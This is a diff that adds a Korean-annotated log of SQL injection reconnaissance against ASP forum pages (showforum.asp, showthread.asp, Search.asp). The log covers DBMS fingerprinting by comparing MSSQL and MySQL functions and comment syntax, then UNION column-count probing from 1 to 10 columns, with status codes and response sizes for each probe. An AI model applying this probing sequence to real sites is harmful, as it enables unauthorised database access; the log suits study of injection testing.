@@ -1,0 +1,50 @@
+### D. DBMS 지문 — 어떤 SQL 방언이 통하는가 (true=200, false/오류=500)
+  baseline                      id=1                         -> 200 3077
+  MSSQL sysobjects>0                                         -> 200 3245
+  MySQL information_schema                                   -> 200 3283
+  MSSQL LEN('a')=1                                           -> 200 3163
+  MySQL LENGTH('a')=1                                        -> 500 1208
+  MSSQL @@version exists                                     -> 200 3185
+  MSSQL CONVERT(int,@@version)                               -> 500 1208
+  MSSQL SUBSTRING                                            -> 200 3223
+  MySQL SUBSTRING                                            -> 200 3223
+  MSSQL ISNULL                                               -> 200 3207
+  주석 -- 동작                                                   -> 200 3089
+  주석 /* */ 동작                                                -> 200 3111
+
+### E. UNION 컬럼 수 탐색 (showforum.asp) — 200 이 나오면 그 컬럼 수가 맞음
+  UNION SELECT 1 cols                                        -> 500 1208
+  UNION SELECT 2 cols                                        -> 500 1208
+  UNION SELECT 3 cols                                        -> 500 1208
+  UNION SELECT 4 cols                                        -> 500 1208
+  UNION SELECT 5 cols                                        -> 500 1208
+  UNION SELECT 6 cols                                        -> 500 1208
+  UNION SELECT 7 cols                                        -> 500 1208
+  UNION SELECT 8 cols                                        -> 500 1208
+  UNION SELECT 9 cols                                        -> 500 1208
+  UNION SELECT 10 cols                                       -> 500 1208
+
+### F. UNION 컬럼 수 탐색 (showthread.asp)
+  baseline id=0                                              -> 200 3031
+  UNION SELECT 1 cols                                        -> 500 1208
+  UNION SELECT 2 cols                                        -> 500 1208
+  UNION SELECT 3 cols                                        -> 500 1208
+  UNION SELECT 4 cols                                        -> 500 1208
+  UNION SELECT 5 cols                                        -> 500 1208
+  UNION SELECT 6 cols                                        -> 500 1208
+  UNION SELECT 7 cols                                        -> 500 1208
+  UNION SELECT 8 cols                                        -> 500 1208
+  UNION SELECT 9 cols                                        -> 500 1208
+  UNION SELECT 10 cols                                       -> 500 1208
+
+### G. UNION 컬럼 수 탐색 (Search.asp tfSearch)
+  UNION SELECT 1 cols                                        -> 500 1208
+  UNION SELECT 2 cols                                        -> 500 1208
+  UNION SELECT 3 cols                                        -> 500 1208
+  UNION SELECT 4 cols                                        -> 500 1208
+  UNION SELECT 5 cols                                        -> 500 1208
+  UNION SELECT 6 cols                                        -> 500 1208
+  UNION SELECT 7 cols                                        -> 500 1208
+  UNION SELECT 8 cols                                        -> 500 1208
+  UNION SELECT 9 cols                                        -> 500 1208
+  UNION SELECT 10 cols                                       -> 500 1208
